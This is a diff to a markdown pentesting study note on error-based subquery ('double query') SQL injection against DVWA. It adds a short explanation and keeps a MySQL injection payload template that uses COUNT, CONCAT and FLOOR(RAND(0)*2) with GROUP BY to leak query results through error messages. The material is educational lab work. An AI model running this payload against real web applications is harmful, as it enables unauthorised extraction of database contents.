@@ -2,9 +2,9 @@
 
 Search Tag(s): #sql-injection #error-based #dvwa
 
-## 1.1 - SubQuery Injection
+## 1.1 - SubQuery (Double Query) Injection
 
-TODO: Fill the information with a step by step approach using error-based subquery SQL injection
+- Subquery injection is often referred as double injection. It is the second method other than union technique. In contrast, the SQL query is more difficult to read yet it can serve as alternative to retrieve data.
 
 ```sql
 1' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((<SQL_Payload>),':',FLOOR(RAND(0) * 2)) grouped_table FROM information_schema.tables GROUP BY grouped_table) tblname_alias)#
@@ -34,8 +34,6 @@ TODO: Fill the information with a step by step approach using error-based subque
 ## References
 
 - [SecurityIdiots: Error-Based Injection Subquery Injection](https://securityidiots.com/Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html)
-
-- [PayloadsAllTheThings SQL Injection: MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
 
 ### Videos
 
